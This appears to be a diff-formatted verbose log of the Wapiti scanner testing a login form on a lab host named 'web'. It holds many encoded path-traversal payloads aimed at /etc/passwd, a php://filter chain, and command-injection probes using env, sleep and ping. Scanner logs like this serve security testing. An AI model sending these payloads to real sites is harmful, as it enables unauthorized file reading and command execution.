+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:16.170 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.187 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:16.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:16.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:16.216 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:16.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.238 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.271 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 14:24:16.281 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:16.294 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:16.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.317 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:16.338 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:16.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:16.359 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:16.371 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.394 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.417 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:16.428 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 14:24:16.438 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.449 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:16.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 14:24:16.478 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:16.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 14:24:16.498 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.520 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.542 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 14:24:16.555 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 14:24:16.568 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 14:24:16.579 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 14:24:16.593 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 14:24:16.606 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 14:24:16.616 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 14:24:16.626 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 14:24:16.636 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=login.php
+2024-03-20 14:24:16.645 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=login.php%00
+2024-03-20 14:24:16.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=login.php%3A%3A%24DATA
+2024-03-20 14:24:16.691 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 14:24:16.707 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:16.719 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:16.723 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%3Benv%3B&password=fuzz
+2024-03-20 14:24:16.732 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%7Cenv%7C&password=fuzz
+2024-03-20 14:24:16.742 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%3Benv%3B&password=fuzz
+2024-03-20 14:24:16.751 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%3Benv%3B&password=fuzz
+2024-03-20 14:24:16.762 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&password=fuzz
+2024-03-20 14:24:16.772 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%3Benv%3B&password=fuzz
+2024-03-20 14:24:16.783 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%0Aenv%3B&password=fuzz
+2024-03-20 14:24:16.796 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%26set%26&password=fuzz
+2024-03-20 14:24:16.808 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=set&password=fuzz
+2024-03-20 14:24:16.817 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=env&password=fuzz
+2024-03-20 14:24:16.825 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%2Fe%00&password=fuzz
+2024-03-20 14:24:16.833 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=fuzz
+2024-03-20 14:24:16.842 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=fuzz
+2024-03-20 14:24:16.849 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=fuzz
+2024-03-20 14:24:16.857 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=fuzz
+2024-03-20 14:24:16.869 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=fuzz
+2024-03-20 14:24:16.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=fuzz
+2024-03-20 14:24:16.888 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=fuzz
+2024-03-20 14:24:16.898 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=fuzz
+2024-03-20 14:24:16.913 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=fuzz
+2024-03-20 14:24:16.923 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=fuzz
+2024-03-20 14:24:16.934 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=fuzz
+2024-03-20 14:24:16.943 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&password=fuzz
+2024-03-20 14:24:16.953 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&password=fuzz
+2024-03-20 14:24:16.962 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%60%29%60&password=fuzz
+2024-03-20 14:24:16.972 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%60sleep%2060%60&password=fuzz
+2024-03-20 14:24:16.981 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%3Bsleep%2060%3B&password=fuzz
+2024-03-20 14:24:16.992 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=a%7Csleep%2060%3B&password=fuzz
+2024-03-20 14:24:17.003 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=%26ping%20-n%2025%20127.0.0.1%26&password=fuzz
+2024-03-20 14:24:17.013 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%3Benv%3B
+2024-03-20 14:24:17.022 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%7Cenv%7C
+2024-03-20 14:24:17.031 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%3Benv%3B
+2024-03-20 14:24:17.042 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%3Benv%3B
+2024-03-20 14:24:17.053 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 14:24:17.061 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%3Benv%3B
+2024-03-20 14:24:17.071 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%0Aenv%3B
+2024-03-20 14:24:17.081 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%26set%26
+2024-03-20 14:24:17.091 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=set
+2024-03-20 14:24:17.102 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=env
+2024-03-20 14:24:17.111 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=%2Fe%00
+2024-03-20 14:24:17.121 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:24:17.131 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/users/login.php (0)
